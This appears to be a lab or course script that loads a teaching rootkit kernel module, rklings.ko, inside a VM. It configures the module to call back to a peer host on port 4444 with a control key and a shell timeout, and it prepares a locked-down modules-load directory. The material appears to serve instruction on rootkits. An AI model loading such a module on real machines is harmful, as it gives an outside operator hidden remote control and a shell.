#!/bin/sh

set -eu

# shellcheck source=scripts/lib/ui.sh
. /vm/ui.sh

key=${1:-}
peer=${2:-}
control_port=${3:-}
shell_port=${4:-}

show()
{
	ui_transcript "$*"
}

run()
{
	show "$@"
	"$@"
}

ui_heading 'Completed course rootkit'
ui_field 'Control' "localhost:4444"

run mkdir -p /etc/modules-load.d
run chmod 0700 /etc/modules-load.d

run ifconfig lo 127.0.0.1 up
show "insmod /rklings/rklings.ko peer_address=... peer_port=... control_key=<redacted>"
insmod /rklings/rklings.ko \
	"peer_address=${peer:-10.0.2.2}" \
	"peer_port=${control_port:-4444}" \
	"control_key=$key" \
	"retry_base_ms=5000" \
	"retry_max_ms=60000" \
	"shell_timeout_ms=60000"

ui_success 'Complete rootkit loaded'
ui_progress 'Use the host operator prompt to inspect and control it'
